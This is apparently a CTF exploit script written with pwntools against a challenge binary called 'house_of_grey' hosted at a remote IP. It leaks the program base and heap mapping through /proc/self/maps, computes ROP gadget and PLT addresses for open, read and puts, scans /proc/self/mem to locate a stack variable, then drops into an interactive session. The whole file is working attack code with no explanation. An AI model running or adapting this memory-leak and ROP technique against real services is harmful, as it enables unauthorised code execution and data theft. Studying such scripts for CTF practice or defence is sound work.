from pwn import *
p=remote('223.112.5.156',50885)
elf = ELF('./house_of_grey')  
open_s_plt = elf.plt['open']  
read_s_plt = elf.plt['read']  
puts_s_plt = elf.plt['puts']  
#pop rdi  
#pop r15  
#retn  
pop_s_rsi = 0x1821  
#pop rdi  
#retn  
pop_s_rdi = 0x1823  
# p=process('./house_of_grey')
def enterRoom():  
   p.sendlineafter(b'Do you want to help me build my room? Y/n?\n',b'Y')  
  
def setPath(content):  
   p.sendlineafter(b'5.Exit\n',b'1')  
   p.sendlineafter(b'So man, what are you finding?\n',content)  
  
def seekTo(pos):  
   p.sendlineafter(b'5.Exit\n',b'2')  
   p.sendlineafter(b'So, Where are you?\n',str(pos).encode())  
  
def readSomething(length):  
   p.sendlineafter(b'5.Exit\n',b'3')  
   p.sendlineafter(b'How many things do you want to get?\n',str(length).encode())  
  
def giveSomething(content):  
   p.sendlineafter(b'5.Exit\n',b'4')  
   p.sendlineafter(b'content:',content)
enterRoom()
context.log_level='debug'
setPath(b'/proc/self/maps')
readSomething(2000)  
p.recvuntil(b'You get something:\n') 
elf_base = int(p.recvuntil(b'-').split(b'-')[0],16)  
pop_rdi = elf_base + pop_s_rdi  
pop_rsi = elf_base + pop_s_rsi  
open_addr = elf_base + open_s_plt  
read_addr = elf_base + read_s_plt  
puts_addr = elf_base + puts_s_plt  
while 1:
    line=p.recvline()
    if b'heap' in line:
        line=p.recvline()
        mmap_start=int(line.split(b'-')[0],16)
        mmap_end=int(line.split(b'-')[1].split(b' ')[0],16)
        break
stack_end=mmap_end
stack_start=mmap_start

print('stack_start',hex(stack_start))
print('stack_end',hex(stack_end))

offset = 0xf800000  
begin_off = stack_end - offset - 24 * 100000  
setPath(b'/proc/self/mem')  
seekTo(begin_off)  
nowloc=begin_off
for i in range(0,24):
    readSomething(100000)  
    content = p.recvuntil(b'1.Find ')[:-7]
    if b'/proc/self/mem' in content:  
      print('found!') 
      arr = content.split(b'/proc/self/mem')[0]  
      break
if i == 23:  
   print('未能成功确定v8的地址，请重试!')
   exit(0)  
v8_addr = begin_off + i * 100000 + len(arr) + 5  
print('v8 addr=',hex(v8_addr))
p.interactive()